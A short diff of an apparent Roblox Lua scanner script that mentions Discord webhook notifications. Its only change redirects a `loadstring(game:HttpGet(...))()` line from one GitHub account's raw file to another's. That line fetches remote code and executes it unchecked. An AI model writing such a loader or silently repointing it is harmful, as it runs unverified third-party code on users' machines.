@@ -581,4 +581,4 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhooks готовы к отправке уведомлений')
-loadstring(game:HttpGet('https://raw.githubusercontent.com/xzoldeveloper/brain/refs/heads/main/botik.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua'))()
